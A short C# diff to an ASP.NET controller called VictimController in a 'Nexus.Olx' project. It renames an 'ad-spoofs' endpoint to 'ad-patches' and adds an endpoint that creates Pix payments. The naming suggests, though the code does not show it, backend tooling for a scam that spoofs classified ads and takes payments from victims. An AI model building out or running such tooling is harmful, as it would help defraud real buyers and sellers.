@@ -1,6 +1,7 @@
 using Microsoft.AspNetCore.Mvc;
 using Nexus.Controllers;
 using Nexus.Olx.Application.Contracts;
+using Nexus.Olx.Application.Requests.Victim;
 
 namespace Nexus.Olx.Presentation;
 
@@ -14,7 +15,13 @@ public sealed class VictimController : NexusController
         _victim = victim;
     }
 
-    [HttpGet("ad-spoofs")]
-    public async Task<ActionResult> ListAdSpoofsAsync(CancellationToken cancellationToken) =>
-        ToResponse(await _victim.ListAdSpoofsAsync(cancellationToken));
+    [HttpGet("ad-patches")]
+    public async Task<ActionResult> ListAdPatchesAsync(CancellationToken cancellationToken) =>
+        ToResponse(await _victim.ListAdPatchesAsync(cancellationToken));
+
+    [HttpPost("pix-payment")]
+    public async Task<ActionResult> CreatePixPaymentAsync(
+        [FromBody] CreatePixPaymentRequest request,
+        CancellationToken cancellationToken) =>
+        ToResponse(await _victim.CreatePixPaymentAsync(request, cancellationToken));
 }
